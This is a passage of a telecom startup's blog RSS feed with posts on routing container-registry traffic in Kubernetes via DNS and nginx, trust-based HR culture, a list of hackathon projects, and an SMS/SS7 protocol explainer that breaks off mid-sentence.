            <content:encoded><![CDATA[<p>At WG2 we’re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.</p><p>We recently decided to improve the registry solution by implementing <a href="https://goharbor.io/" target="_blank" rel="noopener noreferrer">Harbor</a> to scan images for vulnerabilities on upload, and replicating the registry into each of our multiple environments and regions. This would both eliminate Harbor as a single point of failure, and allow each cluster to pull images locally to minimise data transfer costs through the NAT gateway.</p><p>The overall workflow would look something like:</p><ul><li>images are built and uploaded to Harbor</li><li>Harbor scans for vulnerabilities and pushes images to a private registry</li><li>this registry is replicated to a read-only registry</li><li>the read-only registry is replicated to all environments and regions</li><li>the Kubernetes cluster in each environment deploys from the local read-only registry</li></ul><p><img loading="lazy" alt="Workflow" src="/jp/assets/images/multiregion-13365939553782c33c21219d2e21d410.jpg" width="736" height="331" class="img_ev3q"></p><p>Harbor has to live somewhere, so we decided it should live in the dev environment, close to the CI system that builds the majority of our images. However, container image names contain the registry location that they are pulled from / pushed to, eg <code>reg.wgtwo.com/infra/logstash</code>. Therefore in the dev environment we have to find a way to deal with the fact that we want users and the CI system to push to Harbor, but we also want Kubernetes to pull images from the read-only registry.</p><p>So the main problem becomes: if the image name includes the url <code>reg.wgtwo.com</code>, how to make that point to two different places depending on usage?</p><h1>Solution 1: DNS</h1><p>In non-dev environments, the obvious solution is to redirect <code>reg.wgtwo.com -&gt; read-only-registry</code> in Kubernetes CoreDNS. But in dev, we need different services to go to different places. The DNS model thus needs to look like:</p><p><img loading="lazy" alt="DNS" src="/jp/assets/images/dnsresolution-d0a90858bbeab60834fd5f80b85a9ba5.jpg" width="702" height="483" class="img_ev3q"></p><p>In other words,</p><ul><li><code>Route53</code> sets <code>reg.wgtwo.com -&gt; harbor</code></li><li>K8s coreDNS sets <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>CI (Concourse) bypasses cluster lookup and goes to <code>Route53</code> instead, such that <code>reg.wgtwo.com -&gt; harbor</code></li></ul><p>We initially deployed a DNS sidecar to the CI system, but with multiple Concourse pods we got multiple sidecars and we really only needed one, plus we had to manipulate Concourse’s internal DNS cache (<code>CONCOURSE_GARDEN_DNS_SERVER</code>) but that broke DNS between Concourse and everything else in the cluster. Replacing the sidecar with a DNS pod in the CI namespace worked better, although then all the CI jobs needed to be updated to use that new pod as their nameserver.</p><p><img loading="lazy" alt="Sleight of hand" src="/jp/assets/images/sleight-of-hand-fbae8de3401322c1485949179d2a6f32.gif" width="455" height="248" class="img_ev3q"></p><p>However at this point we realised that although we want to deploy pods into Kubernetes, the process that does the deploying lives on the Kubernetes nodes, outside of cluster scope.
We don’t do any config management on the nodes, we just let <a href="https://github.com/kubernetes/kops" target="_blank" rel="noopener noreferrer">kOps</a> deploy everything that Kubernetes needs for a cluster, so we were reluctant to introduce an entirely different system just for managing one <code>resolv.conf</code> file. Also the concentric DNS setup would have a very wide scope and be somewhat difficult to debug. Maybe this was a problem better resolved using some clever nginx routing?</p><h1>Solution 2: nginx</h1><p>If we could find some way of differentiating the Harbor traffic from read-only-registry traffic, we could let nginx route requests to the right place.</p><iframe src="https://giphy.com/embed/QaPkV29BJh3gI" width="240" height="177" frameborder="0" class="giphy-embed" allowfullscreen=""></iframe><h1>Solution 2a: nginx routes traffic on IP</h1><ul><li>Traffic from the outside world plus traffic from Concourse needs to go to Harbor.</li><li>Traffic from the Kubernetes cluster needs to go to the read-only-registry.</li></ul><p>The <a href="https://nginx.org/en/docs/http/ngx_http_geo_module.html" target="_blank" rel="noopener noreferrer">nginx geo module</a> sounded like a good idea, where we could set our internal subnet ranges to go to the read-only-registry. However getting the ingress annotations to put this config in the right place turned out to be challenging, since it needs to go outside of both <code>http snippet</code> and <code>server snippet</code> blocks. But before we dug further into this issue we realised that all of the traffic to nginx would arrive via the internet gateway, meaning we wouldn’t see source IP anyway.</p><h1>Solution 2b: nginx routes on custom header</h1><p>The new <code>canary</code> feature in nginx makes this kind of routing very easy - traffic that matches a certain criteria gets sent to a different backend. We could use a custom header such as <code>ro-reg</code> to send internal traffic to the read-only registry.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">annotations:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  nginx.ingress.kubernetes.io/canary: "true"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  nginx.ingress.kubernetes.io/canary-by-header: "ro-reg"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The docker (client) config has an <a href="https://github.com/docker/cli/blob/master/man/docker-config-json.5.md" target="_blank" rel="noopener noreferrer">HttpHeaders</a> section, so it would be easy enough to add this section to all of our image-pull secrets, meaning all internal pulls - but nothing else - should go to the read-only registry.</p><p>We had to rearrange things a little in order to terminate SSL on nginx and not at the registry so that nginx would be able to read the headers, but that was straightforward.</p><p>In our initial tests from the laptop, this worked great. However it quickly transpired that this was the only place it worked from. Where we needed it to work from - the Kubernetes nodes - didn’t run Docker, they run <code>docker-shim</code> on top of <code>containerd</code>, and <code>HttpHeaders</code> <a href="https://github.com/containerd/cri/issues/1400" target="_blank" rel="noopener noreferrer">are not implemented yet</a>. Back to the drawing board.</p><h1>Solution 2c: nginx routes on auth header</h1><p>Getting nervous that we’d used a week to get nothing working, we started clutching at some very hacky straws. Even if docker-shim doesn’t send custom headers, we could see it sending auth headers, and we have different login details for Harbor versus the read-only registry. We wondered if we could route on the auth hash, postponing entirely the discussion about whether we should do such a horrible thing, or the security implications of having the auth hash in a plaintext nginx config.</p><iframe src="https://giphy.com/embed/I8RMi1UY8cEKs" frameborder="20px" class="giphy-embed" allowfullscreen=""></iframe><p>We soon discovered that this solution was also never going to work. In Kubernetes, it is the <code>kubelet</code> process that does the image pull at the start of a pod deployment, and after some wiresharking it turns out that the very first thing kubelet does is make an unauthenticated call to the <code>registry/v2</code> endpoint to fetch metadata which it then uses to begin authentication.</p><p>This is expected behaviour for a docker registry, <a href="https://docs.docker.com/registry/spec/auth/token/" target="_blank" rel="noopener noreferrer">according to documentation</a>, but with nginx routing on auth header, it meant that the initial call was routed to Harbor which sent back an auth URL also for Harbor, and thus kubelet never even arrived at the read-only registry, let alone managed to authenticate.</p><h1>Aside: other issues with headers</h1><p>During this debugging session we also realised that we’d been creating image-pull secrets in Kubernetes with both <code>.dockercfg</code> and <code>.dockerconfigjson</code>, not realising that <code>.dockercfg</code> <a href="https://github.com/moby/moby/pull/12009" target="_blank" rel="noopener noreferrer">is the old format</a> and that <code>.dockercfg</code> likely does not support HttpHeaders at all.</p><p>Kubelet <a href="https://github.com/Kubernetes/Kubernetes/blob/e1fd2d7ff57af153023347d72d17226effd917c8/pkg/credentialprovider/config.go#L44" target="_blank" rel="noopener noreferrer">does support HttpHeaders</a>, but relies on the underlying container runtime to also support them - which is not the case for containerd.</p><p>Additionally, when creating a Kubernetes secret containing <code>.dockerconfigjson</code>, it appears that it is very important that there is no whitespace in the secret, or authentication will fail.</p><h1>Solution 2d: route on some other inherent header</h1><p>As one final attempt at making nginx routing work, we looked for other headers being sent, but there was no single header that let us differentiate between kubelet, laptop, and Concourse.</p><p>Kubelet sends a useragent of either <code>docker</code> or <code>go-http-agent</code> (depending on whether the call is the initial one or a retrial) and filtering on <code>go-http-agent</code> also catches Concourse requests, rendering it useless for this task. We were also worried it might end up catching all sorts of unintended cases since we have quite a lot of <code>go</code>-based applications in our ecosystem.</p><p>We took a moment to mourn the loss of our nginx idea, and went back to a DNS solution.</p><p><img loading="lazy" alt="Mourn" src="/jp/assets/images/pulpfiction-14c68561ce1cdd95a2ad42f3fde27b1e.jpg" width="800" height="450" class="img_ev3q"></p><h1>Solution 3: DNS, again</h1><p>We put the DNS solution back in place again, where</p><ul><li><code>Route53</code> sets <code>reg.wgtwo.com -&gt; harbor</code></li><li>K8s nodes set <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>K8s coreDNS sets <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>CI runs an additional coreDNS pod setting <code>reg.wgtwo.com -&gt; harbor</code></li><li>Concourse uses CI coreDNS pod to set <code>reg.wgtwo.com -&gt; harbor</code></li></ul><p>Which brought us back to the problem that was still there: how to update <code>/etc/resolv.conf</code> on the nodes. In the continued absence of config management, we hit upon the wonderful hack of using a privileged pod daemonset to manage the config for us via systemd.</p><p>The privileged pod on each node would write a new config file to <code>/etc/systemd/resolvd.conf</code>, and then restart the systemd service to update the running resolvd process.</p><p>This would thus control configuration on the Kubernetes node from inside of Kubernetes, which is admittedly morally wrong but also works really well. It also keeps the configuration alongside all the rest of our configuration instead of hidden away somewhere new.</p><p><img loading="lazy" alt="wheel change" src="/jp/assets/images/wheelchange-57e19e4d177f74c50d800c3268440f30.gif" width="500" height="282" class="img_ev3q"></p><p>A future solution might be to implement some kind of local DNS server/cache on each node, but for now we’ll settle for a working system and a huge increase in knowledge about the inner workings of many of our components.</p>]]></content:encoded>
            <category>dns</category>
            <category>nginx</category>
            <category>kubernetes</category>
            <category>infrastructure</category>
        </item>
        <item>
            <title><![CDATA[We're all grownups here]]></title>
            <link>https://www.wgtwo.com/jp/blog/were-all-grownups-here</link>
            <guid>were-all-grownups-here</guid>
            <pubDate>Fri, 20 Nov 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[I have always struggled with company HR policies that make me not feel trusted. Why don’t HR and/or management trust who they hire? Why create HR processes for the very few people who don’t behave? Shouldn’t processes be designed for the vast majority of people who are to be trusted? I just don’t get it. If you are given freedom it comes with a lot of responsibility, isn’t that rather implicit?]]></description>
            <content:encoded><![CDATA[<p>I have always struggled with company HR policies that make me not feel trusted. Why don’t HR and/or management trust who they hire? Why create HR processes for the very few people who don’t behave? Shouldn’t processes be designed for the vast majority of people who are to be trusted? I just don’t get it. If you are given freedom it comes with a lot of responsibility, isn’t that rather implicit?</p><p>It comes down to a choice - minimize risk by implementing all possible controls, or trust people and implement necessary controls only. We believe the latter drives ownership, motivation and a better product and company. That doesn’t mean it is easy though - the need to control is a fundamental human need, and we need daily reminders to always push in the opposite direction.</p><p>When I was in discussions with Erlend (our CEO) about joining <strong>wgtwo</strong>, the term “startup for grownups” was used and I remember thinking “huh, that makes sense”. Now, 2 years in, the simple fact that yes we are all grownups here and we all deserve to be treated as such has become an embedded part of our company culture.</p><p>I wanted to give you some tangible examples of how we do things. For context, we are a startup tech company with a team of ~50 (87% engineers). We have offices in Oslo, Trondheim, Stockholm, a hub in Germany and remote team members in Japan, Spain, the U.S., Canada, London and Myanmar.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-approvals">What approvals?<a class="hash-link" href="#what-approvals" title="Direct link to heading">​</a></h2><p>We try to minimize that amount of approvals necessary to a minimum. Here is how we communicate that to new hires in some of the areas companies typically have approvals</p><ul><li>Vacation: Yes, we do have the standard 25 days of vacation (standard in the Nordics) in our contracts. But, we also trust you to know yourself best, and understand that no year or situation is the same. Sometimes you might need more, sometimes less. As long as it works for your team, we trust you to make a judgement. We also trust that you take enough time off as we all need time off to reset and recharge.</li><li>Expenses: We trust your judgement and that you wouldn’t be making the purchase if it wasn’t necessary for you and the team. This applies when deciding on which equipment (i.e. laptop, monitor, keyboard, phone etc) you need when you start and later if there is something you need. I have yet to experience anyone asking for anything totally unreasonable. Of course you are welcome to reach out if you are unsure and from time to time we might have discussions, but surprisingly seldom to be honest.</li><li>Travel: We encourage you to travel between offices to build a strong relationship with the whole team (unfortunately not now of course with the covid-19 going on). You do not need approval to book travel, and remember you don’t need a “reason” to go.</li><li>Working hours: As long as you do a good job we don’t care if you work half days Mondays or start working at lunch time and into the evening, go to the gym and so on. Up to you, as long as it works for your team. Not to mention where you work from. Office, home, cabin, boat - who cares as long as you are connected right?</li></ul><p>These aren’t necessarily big things in everyday life, but they take out administrative hassle, and it aligns with the messaging of that we try to trust each other.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="are-you-a-role-model">Are you a role model?<a class="hash-link" href="#are-you-a-role-model" title="Direct link to heading">​</a></h2><p>This lack of approvals does create another need though - the need for role models. So we do remind the team to keep in mind that we are role models for each other. It provides alignment. Whether it’s sharing with the others that the train ticket prices are currently low and recommend people to book now to save money, or taking initiative to set up a virtual social Friday get-together to end the week together. We even have our own role model emoji in slack, which we sometimes remember to use and I do believe people feel proud if they get one.
<img loading="lazy" alt="Decorative illustration" src="/jp/assets/images/04-6102a030ce10e2f308dd0bd328571b30.png" width="650" height="460" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="sharing-is-caring">Sharing is caring<a class="hash-link" href="#sharing-is-caring" title="Direct link to heading">​</a></h2><p>That we see each other as grownups is also evident in how we communicate and what information we trust each other with. If there is one thing the team mentions to me that has surprised them the most after joining, it is the amount of information that is shared across the team about sales, customer meetings and other business processes. The good and the bad. When I had a “6 months in” check-in with one of our newest team members he emphasized exactly this and explained how this made him feel involved and prepared for what was coming. It is also evident when people choose to share that they are struggling with the likes of depression or something else often considered very private. Or just putting up your hand and saying “I broke something” and taking responsibility for that. I believe this level of sharing is possible because we trust each other and have each other's backs and management leads the way when it comes to sharing.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="direction">Direction<a class="hash-link" href="#direction" title="Direct link to heading">​</a></h2><p>To clarify. We do of course need to make sure we move the company in the right direction together. We have chosen to use OKRs (Objectives and Key Results) as a tool for that. A tool that helps us discuss and decide together as a team what we want to achieve, but without dictating the how. This is a delicate balance, and we always have to fight to not create too detailed OKRs. The teams and individuals should feel empowered when understanding and agreeing on the why and what, but are allowed to determine the how.
<img loading="lazy" alt="Decorative illustration" src="/jp/assets/images/03-3e1450c12d932be4390b9de724d4a6b2.png" width="662" height="378" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="stay-open-to-change">Stay open to change<a class="hash-link" href="#stay-open-to-change" title="Direct link to heading">​</a></h2><p>So do we have improvement areas? Of course! One example is that I believe we can be better at living one of our values which is “Tough Love”. This relates to among other things how we give feedback. I wouldn’t say we are bad at it, but our inclination is often towards being a bit too soft, which sometimes leads to unclear feedback or neglecting giving feedback. So we need to keep practicing to make sure we challenge and develop each other as much as we can. And I’m sure it’s a bunch of other stuff. We are still a young company and open to change - we try out stuff and sometimes fail. We keep on learning and making small tweaks all the time to adjust to our team. Just this morning I listened to an inspiring 5 min talk from Lucy Adams about probation periods and realized that we have those in our contracts -  yikes that doesn’t exactly scream that we trust who we recruit does it? I will look into that asap…</p><p>So, we are all grownups here. At least most of the time. Although maybe not when the Trondheim team bought naughty chocolates and expensed it to see if anyone would notice (we didn’t).</p>]]></content:encoded>
            <category>trust</category>
            <category>culture</category>
            <category>startup</category>
        </item>
        <item>
            <title><![CDATA[October Virtual Hackdays]]></title>
            <link>https://www.wgtwo.com/jp/blog/hackdays-october-2020</link>
            <guid>hackdays-october-2020</guid>
            <pubDate>Wed, 28 Oct 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[this week we started off with a three days hackathon!]]></description>
            <content:encoded><![CDATA[<p>this week we started off with a three days hackathon!</p><p>Every quarter <strong>wgtwo</strong> holds a three day hackday. Hackdays are a great way for everyone in the company to work together in creating new innovative solutions for every day problems.</p><p>This time, we had the joy of having a three day remote hackday that included 10+ teams and yes - <em>pizza</em>.</p><img loading="lazy" class="image" src="/img/blog/hackdays-october-2020/presentations.png" alt="Most of us"><h1>Hackday Presentations</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="grafana-annotations">Grafana Annotations<a class="hash-link" href="#grafana-annotations" title="Direct link to heading">​</a></h2><p><em>Team: Jonny, Per, Victoria</em></p><p>Add git commit and other tags (i.e. pagerduty alerts) as annotations in Grafana.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="tokens-to-the-people">Tokens to the people<a class="hash-link" href="#tokens-to-the-people" title="Direct link to heading">​</a></h2><p><em>Team: Håkon</em></p><p>Easy access to create new developer tokens to our APIs.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="its-broken-or-malware">It's broken (or malware)<a class="hash-link" href="#its-broken-or-malware" title="Direct link to heading">​</a></h2><p><em>Team: Holger, Noy</em></p><p>Setup pies to be able to automate testing.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="java-11-toolchain">Java 11 Toolchain<a class="hash-link" href="#java-11-toolchain" title="Direct link to heading">​</a></h2><p><em>Team: Stein Eldar</em></p><p>Upgrade of Java toolchain in Bazel!</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="random-bazel-facts">Random bazel facts<a class="hash-link" href="#random-bazel-facts" title="Direct link to heading">​</a></h2><p><em>Team: Konstantin</em></p><p>Good to have configurations for Bazel caching.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="gtp-c-tracing-on-pgw">GTP-C tracing on PGW<a class="hash-link" href="#gtp-c-tracing-on-pgw" title="Direct link to heading">​</a></h2><p><em>Team: Pavel</em></p><p>Investigate and experiment how to upload PCAP traces from PGW in S3.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="mtr-packet-exporter">mtr-packet-exporter<a class="hash-link" href="#mtr-packet-exporter" title="Direct link to heading">​</a></h2><p><em>Team: Bjørn</em></p><p>Export routing hops and latency metrics to prometheus.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="kafka-voice---kava">Kafka voice - kava<a class="hash-link" href="#kafka-voice---kava" title="Direct link to heading">​</a></h2><p><em>Team: Sergey</em></p><p>Kafka instead of Firebreeze as a backend for Voice.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="parental-control-on-pgw">Parental Control on PGW<a class="hash-link" href="#parental-control-on-pgw" title="Direct link to heading">​</a></h2><p><em>Team: Etienne / Nicholas</em></p><p>Dynamic subscriber-based APN configurations for parental control DNS.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="text-rules">text rules<a class="hash-link" href="#text-rules" title="Direct link to heading">​</a></h2><p><em>Team: Jørund</em></p><p>Migrating SMS forwarding into a separate app under <strong>wgtwo</strong> developer platform.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="distributed-tracing">Distributed tracing<a class="hash-link" href="#distributed-tracing" title="Direct link to heading">​</a></h2><p><em>Team: Karl Johan/William</em></p><p>Jaeger tracing to be able to follow time spent in different components.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-ideas-to-attracthire-engineers">3 ideas to attract/hire engineers<a class="hash-link" href="#3-ideas-to-attracthire-engineers" title="Direct link to heading">​</a></h2><p><em>Team: Ana/Jessica</em></p><p>Advent of code, showing engineering day-to-day work, image/video snippets.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="mqtt-for-events">MQTT for events<a class="hash-link" href="#mqtt-for-events" title="Direct link to heading">​</a></h2><p><em>Team: GI</em></p><p>Home automation with MQTT server as an app.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="david-sucks-at-load-testing-loomylin">David sucks at load testing (loomylin)<a class="hash-link" href="#david-sucks-at-load-testing-loomylin" title="Direct link to heading">​</a></h2><p><em>Team: David</em></p><p>Utilize project Loom to get lightweight virtual threads in JVM.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="aws-transit-gateway">AWS Transit Gateway<a class="hash-link" href="#aws-transit-gateway" title="Direct link to heading">​</a></h2><p><em>Team: Erhan</em></p><p>Maintaining routes and connecting subnets between VPCs with a transit gateway.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="pcap-traces-as-json">PCAP traces as JSON<a class="hash-link" href="#pcap-traces-as-json" title="Direct link to heading">​</a></h2><p><em>Team: Masse</em></p><p>Translate pcaps to a readable format and upload it to Athena.</p><img loading="lazy" class="image" src="/img/blog/hackdays-october-2020/hackday.jpeg" alt="hackday logo stickers">]]></content:encoded>
            <category>hackathon</category>
        </item>
        <item>
            <title><![CDATA[What the heck is a short message?]]></title>
            <link>https://www.wgtwo.com/jp/blog/what-is-a-short-message</link>
            <guid>what-is-a-short-message</guid>
            <pubDate>Thu, 01 Oct 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[I will try as best as I can to give an explanation of what happens]]></description>
            <content:encoded><![CDATA[<p>I will try as best as I can to give an explanation of what happens
when you send an SMS from your phone.</p><p>Disclaimer: Telco stuff is hard.</p><p>Also disclaimer: this blog post will also contain alot of ackronyms,
after all, it is telco.</p><p><em>Aaand down the rabbit hole we go...</em></p><h1>Where to even start</h1><p>In the <em>SS7</em> (telco/telecom/telecommunications) network there are many
different nodes (servers), with different kinds of tasks.</p><p>The group of protocols that is used to send signals over <em>IP</em> between
these nodes is called <em>SIGTRAN</em> (derived from "signaling transport").
Older networks that have not switched to <em>IP</em> do not use <em>SIGTRAN</em>.</p><p><em>SIGTRAN</em> protocols are the lower layer protocols used for signaling,
they range from <em>SCTP</em> (Stream Control Transmission Protocol) to
<em>M2PA</em> (Message Transfer Part 2 User Peer-to-Peer Adaptation Layer)
and <em>M3UA</em> (Message Transfer Part 3 User Adaptation Layer).</p><p><em>SCTP</em> is like a mix between <em>UDP</em> and <em>TCP</em>. It is supposed to be
quicker than <em>TCP</em>, but more reliable than <em>UDP</em>.</p><p>Both <em>M2PA</em> and <em>M3UA</em> support <em>SCTP</em> management, and the reporting of
status changes of those, as well as providing transfer of <em>MTP3</em>
(Message Transfer Part 3) messages.</p><p>On top of <em>SIGTRAN</em> are the <em>SS7</em> protocols.</p><p>What I'm going to talk about are the protocols on the very top of <em>SS7</em>,
specifically the <em>MAP</em> (Mobile Application Part) as well as the <em>TCAP</em>
(Transaction Capabilities Application Part). There are other protocols
inbetween, for instance <em>SCCP</em> (Signalling Connection Control Part)
which handles some handshaking, routing, and resilience.</p><p>The <em>MAP</em> layer is used when talking to some of the telco nodes such
as <em>HLR</em> (Home location registry), <em>VLR</em> (Visitor location registry),
<em>MSC</em> (Mobile switching centre), <em>SGSN</em> (Serving <em>GPRS</em> <!-- -->[ackronym in
ackronyms; go telco!]<!-- --> support node) and the <em>SMSC</em> (Short message
service centre).</p><h1>MAP versions and TCAP dialogues</h1><p>There are some iterations of <em>MAP</em> (v1, v2, v3, and v4) and messages
almost always come in pairs, an acknowledgement (<code>ReturnResult</code> or
<code>ReturnError</code>) for each sent message (<code>Invoke</code>).</p><p>To determine which version to use between two nodes, the sending node
tries to start the transaction (called a dialogue) by sending a <em>TCAP</em>
<code>Begin</code> message with the <em>MAP</em> message and it's highest compatible
version. If the receiving node cannot talk that version, it sends a
<em>TCAP</em> <code>Abort</code> message with it's highest compatible version. In v1
there might not even be a reason, just an empty <code>Abort</code>; the sending
node might then try to send the <em>MAP</em> message as v1 anyway.</p><p>In my head it goes like this:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Hi, I want to talk version 3 to you about this"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "No I don't understand you, but we can talk version 2 about it instead"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Ok, then I want to talk version 2 to you about this instead"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "Aah, now I see..."</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Or maybe</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Hi, I want to talk version 3 to you about this"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "No"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Ok, then I want to talk to you about this in version 1 instead"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "Maybe I will talk to you, maybe I will not"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For <em>TCAP</em> dialogues there are (mainly) four message types.  <code>Begin</code>,
<code>Continue</code>, <code>End</code>, <code>Abort</code>. Each of the types have an ID (or two, as I
said, telco is complicated), a component and a dialogue part. The
component contains the <em>MAP</em> message. The dialogue part contains
the version and application to use (that is <em>MAP</em> Application;
i.e. which type of message it contains), but it is only used in the
first message from both nodes for the version negotiation.</p><p><em>I think this covers most of it, let's get back to the fun part.</em></p><h1>How does SMS work?</h1><p><em>SMS</em> was initally implemented because of the wish to send text
messages to pagers using the phoneline when it was not in use for
phonecalls. It was decided at a meeting in Oslo to be released to the
public when some French and German company understood it's
value. (Don't quote me on any of this).</p><p>When you send an <em>SMS</em>, the <em>SMS</em> is transfered to the <em>MSC</em> or the
<em>SGSN</em> in your current (serving) network. The <em>MSC</em> or <em>SGSN</em> then
sends an packet called <code>MO-Forward-SM</code> towards the <em>SMSC</em> in your
current network. It stands for "Mobile Originating Forward Short
Message" meaning it started from your (mobile-)phone.</p><p>The <em>SMSC</em> then asks the recipients HLR about the routing details for
the <em>SMS</em>. It does so by sending another <em>MAP</em> message of type
<code>sendRoutingInfoForSM</code> requesting the location of the recipients <em>MSC</em>
or <em>SGSN</em>, or both.</p><p>The <em>SMSC</em> then sends another packet, this time a <code>MT-Forward-SM</code>,
towards the <em>MSC</em> in the recipients network. In this case <em>MT</em> stands
for Mobile Terminated, meaning it goes towards the recipients phone.</p><p><em>Dia have amazing icons:</em></p><div><img loading="lazy" src="/img/blog/sms/forward-sm.svg" alt="You calling your mom" class="img_ev3q"></div><p>The similarities in <em>MO</em> and <em>MT</em> requests are that they both contain
a origin and destination address as well as the user data (your actual
text message), and a possibly a correlation id which is basically a
mapping between your SIM-card id and a temporary id and was originally
used for making sure that the sending network paid for <em>SMS</em>s towards
the receiving network.</p><p>For <em>MO</em> the origin address is your <em>MSISDN</em> (read telephone number),
and the destination is the <em>GT</em> address (Global title; a way to route
stuff) of the <em>SMSC</em>. For <em>MT</em> messages the origin address is the <em>GT</em>
of the <em>SMSC</em> and the destination address is either the recipients
<em>IMSI</em> (read SIM-card) or the recipients correlation id. It could also
be a <em>LMSI</em> which is a 4-byte network location identifier if the
recipient is also within the same network as the sender.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="ever-wondered-why-there-is-a-limit-to-the-size-of-the-text-message-you-are-sending">Ever wondered why there is a limit to the size of the text message you are sending?<a class="hash-link" href="#ever-wondered-why-there-is-a-limit-to-the-size-of-the-text-message-you-are-sending" title="Direct link to heading">​</a></h2><div class="left-right-row"><div class="text">Two characters left on a GSM7 encoded SMS.</div><img loading="lazy" class="image" src="/img/blog/sms/160_chars.png" alt="Characters left: 2/160"></div><p>If you (god forbid) you would break the protocol and send a text
message greater than 140 bytes, which translates to 160, 152, or 70
characters depending on locale <!-- -->[1]<!-- -->, then your phone would break up the
message into multiple text messages. This arbitrary size of 140 bytes
is not really arbitrary at all. It was chosen because it would
precisely fit into a single <em>MTP3</em> <em>SIF</em> (Signalling Information
Field) when routing label, <em>SCCP</em>, <em>TCAP</em> and <em>MAP</em> layers were taken
into account.</p><p>[1]<!-- --> There is something called <em>GSM7</em> bit-packing. Instead of using 1
byte (8 bits) per character, <em>GSM7</em> uses 7 bits. This means that
instead of 140 characters, you can get up to 160 characters per
<em>SMS</em>. The drawback is that you will have a smaller subset of
characters to use, only the most common is supported. If you include
any non-<em>GSM7</em> characters in your <em>SMS</em> then the <em>SMS</em> will
automatically be converted to use either <em>USC-2</em> or <em>GSM7</em> with a
